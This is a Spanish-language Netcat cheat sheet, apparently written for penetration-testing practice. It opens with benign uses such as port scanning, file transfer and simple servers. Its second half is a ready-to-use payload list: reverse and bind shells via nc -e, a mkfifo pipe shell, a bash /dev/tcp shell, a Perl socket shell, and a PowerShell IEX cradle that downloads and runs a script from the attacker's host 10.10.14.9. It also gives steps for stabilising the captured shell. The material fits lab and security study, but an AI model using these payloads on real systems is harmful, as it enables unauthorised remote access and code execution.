"La navaja suiza del TCP/IP”.
Puede utilizarse, por ejemplo:
- Para diagnosticar errores y problemas que afecten a la funcionalidad y la seguridad de una red.
- Para escanear puertos
- Para hacer streaming de datos o simplemente transferirlos.
- Para configurar servidores de chat y de web
- Para iniciar consultas por correo. 
Este software minimalista, desarrollado a mediados de los 90, puede operar en modo servidor y cliente.

## Descripción
Netcat, a menudo denominado "nc", es una herramienta de red multifuncional y poderosa que permite leer y escribir datos a través de conexiones de red utilizando TCP o UDP. Se le conoce como la "navaja suiza" del TCP/IP debido a su capacidad para realizar una amplia variedad de tareas relacionadas con la red, desde escaneo de puertos hasta transferencia de archivos y conexiones remotas.

## Usos Comunes de Netcat
1. Escaneo de Puertos
Netcat puede ser usado para verificar la conectividad de puertos de manera simple.
```bash
nc -zv [IP] [puerto_inicial]-[puerto_final]
```
Ejemplo para escanear puertos del 20 al 80:
```bash
nc -zv 10.10.10.10 20-80
```

2. Transferencia de Archivos
Netcat permite la transferencia de archivos entre sistemas de manera sencilla.
En el servidor (escuchando en el puerto 1234):
```bash
nc -lvp 1234 > archivo_recibido.txt
```
En el cliente (enviando el archivo):
```bash
nc [IP_servidor] 1234 < archivo_a_enviar.txt
```

3. Crear Servidores de Chat o Web Simples
Netcat se puede utilizar para configurar un servidor de chat básico o un servidor web.

- Ejemplo para un servidor de chat:
En el servidor (escuchando en el puerto 12345):
```bash
nc -lvp 12345
```
En el cliente (conectándose al servidor):
```bash
nc [IP_servidor] 12345
```

4. Consulta Remota a través de Netcat
Netcat puede ser utilizado para realizar consultas a servidores de correo o bases de datos, simulando las peticiones de un cliente.

- Ejemplo para conexión a un servidor HTTP en el puerto 80:
```bash
nc [IP_servidor] 80
GET / HTTP/1.1
Host: [IP_servidor]
```

## Modo Servidor y Cliente
Netcat opera en dos modos principales:
1. Modo Servidor: Escucha en un puerto para recibir conexiones.
```bash
nc -lvp [puerto]
```

2. Modo Cliente: Se conecta a un puerto en otro sistema.
```bash
nc [IP] [puerto]
```

## Ejemplo Completo de Uso
1. Escaneo de puertos en un rango de 1 a 100:
```bash
nc -zv 192.168.1.1 1-100
```
2. Transferencia de archivo de texto:
- Servidor:
```bash
nc -lvp 1234 > archivo_recibido.txt
```
- Cliente:
```bash
nc 192.168.1.1 1234 < archivo_a_enviar.txt
```

## Conclusión
Netcat es una herramienta esencial para auditorías de red y pruebas de penetración. Su versatilidad en la comunicación a través de redes lo convierte en una opción valiosa para tareas como escaneo de puertos, transferencia de archivos y conexiones remotas.

---
## **1. Tipos de Shells con Netcat**
### **Reverse Shell** (la víctima se conecta al atacante)
📌 Se usa cuando la víctima está detrás de un firewall/NAT y **no se puede acceder directamente**.  
**Modo de uso:**  
1. **El atacante escucha en un puerto** (ejemplo: 443)
```bash
nc -lvnp 443
```

2. **La víctima ejecuta Netcat y se conecta al atacante**  
**En Windows:**
```powershell
nc64.exe -e cmd.exe 10.10.14.9 443
```
**En Linux:**
```bash
nc -e /bin/bash 10.10.14.9 443
```

**Si `-e` está deshabilitado** (Netcat moderno):
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.9 443 > /tmp/f
```
### **Bind Shell** (el atacante se conecta a la víctima)
📌 Se usa cuando se tiene acceso directo a la máquina víctima.  
**Modo de uso:**  
1. **La víctima abre una shell en un puerto**
```bash
nc -lvnp 4444 -e /bin/bash
```

2. **El atacante se conecta a la víctima**
```bash
nc 10.10.14.8 4444
```

🚨 **Problema:** Si un firewall bloquea conexiones entrantes, este método no funcionará.

## **2. Payloads Alternativos**
🔹 **Windows (PowerShell Reverse Shell)**
```powershell
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.9/shell.ps1')"
```

🔹 **Bash Reverse Shell (Linux)**
```bash
bash -i >& /dev/tcp/10.10.14.9/443 0>&1
```

🔹 **Perl Reverse Shell**
```perl
perl -e 'use Socket;$i="10.10.14.9";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
```

## **3. Técnicas para estabilizar la shell**
📌 Cuando obtenemos una shell, muchas veces está limitada. Para hacerla interactiva:
1. 
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
2. 
```bash
export TERM=xterm
```
3. Hacemos `Ctrl + Z` para suspender la Shell
4. 
```bash
stty raw -echo; fg
```
5. 
```bash
reset
```

## **4. Consideraciones de Seguridad**
**Peligros de Netcat**
- Puede ser detectado y bloqueado por antivirus y firewalls.
- En entornos seguros, se recomienda usar herramientas como `ncat` o `socat` que permiten cifrado.
